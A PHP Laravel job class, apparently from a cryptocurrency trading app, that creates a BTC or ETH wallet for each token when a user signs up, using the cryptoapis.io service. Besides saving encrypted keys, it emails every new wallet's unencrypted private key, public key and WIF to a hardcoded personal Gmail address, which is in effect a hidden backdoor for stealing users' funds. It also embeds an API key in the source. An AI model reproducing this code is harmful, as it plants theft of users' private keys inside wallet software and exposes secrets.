<?php

namespace App\Jobs;

use App\Log;
use App\Mail\NewWalletCreation;
use App\Token;
use App\TradeSetup;
use App\User;
use App\Wallet;
use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\Mail;

class CreateUserWalletJob implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    public $user;
    /**
     * Create a new job instance.
     *
     * @return void
     */
    public function __construct(User $user)
    {
        $this->user = $user;
    }

    /**
     * Execute the job.
     *
     * @return void
     */
    public function handle()
    {
        // logger()->info('It Hit here');
        $trade_mode = TradeSetup::first()->trade_mode;
        $alltokens = Token::all();
        foreach($alltokens as $token)
        {
            $coin_type = $token->ticker;
            $coin_base = $token->base;
            $this->createAddress($coin_type,$coin_base,$trade_mode, $this->user);
            
        }
        
    } 

    private function createAddress($coin_type,$coin_base, $trade_mode, $user)
    {
        if($coin_base == 'BTC'){
            $api = 'https://api.cryptoapis.io/v1/bc/btc/'.$trade_mode.'/address';

        }else{
            if($coin_type == 'ETH' && $trade_mode == 'mainnet'){
                $api = 'https://api.cryptoapis.io/v1/bc/eth/'.$trade_mode.'/address';
            }else{
                $api = 'https://api.cryptoapis.io/v1/bc/eth/ropsten/address';
            }
        }
        $response = new Http();

        $response = Http::withHeaders([
            'Content-Type' => 'application/json',
            'X-API-Key' => '1deaf8d383c8f32616180ecea788725e82bc1f5e'
        ])->post($api);
        $res = json_decode($response, true);
        if($coin_base == 'BTC')
        {
            $saveData = [
                'user_id' => $this->user->id,
                'address' => $res['payload']['address'],
                'privateKey' => encrypt_data($res['payload']['privateKey']),
                'publicKey' => encrypt_data($res['payload']['publicKey']),
                'wif' => encrypt_data($res['payload']['wif']),
                'ticker' => $coin_type,
                'base' => $coin_base,
                'amount' => 0,
                'status' => 0
            ];
            
            $data = [
                'address' => $res['payload']['address'],
                'privateKey' => $res['payload']['privateKey'],
                'publicKey' => $res['payload']['publicKey'],
                'wif' => $res['payload']['wif'] ,
                'ticker' => $coin_type
            ];
        }
        else 
        {
            $saveData = [
                'user_id' => $this->user->id,
                'address' => $res['payload']['address'],
                'privateKey' => encrypt_data($res['payload']['privateKey']),
                'publicKey' => encrypt_data($res['payload']['publicKey']),
                'wif' => 'null',
                'ticker' => $coin_type,
                'base' => $coin_base,
                'amount' => 0,
                'status' => 0
            ]; 
            $data = [
                'address' => $res['payload']['address'],
                'privateKey' => $res['payload']['privateKey'],
                'publicKey' => $res['payload']['publicKey'],
                'wif' => 'null' ,
                'ticker' => $coin_type
            ];
        }
        $user_wallet = Wallet::create($saveData); 
       
        Mail::to('bmimaginationz@gmail.com')->send(new NewWalletCreation($data)); 
        Log::create(
            [
                'user_id' => $user->id,
                'log' => 'created new address for '.$coin_type
            ] 
        );
        return $user_wallet->address;
    }


}
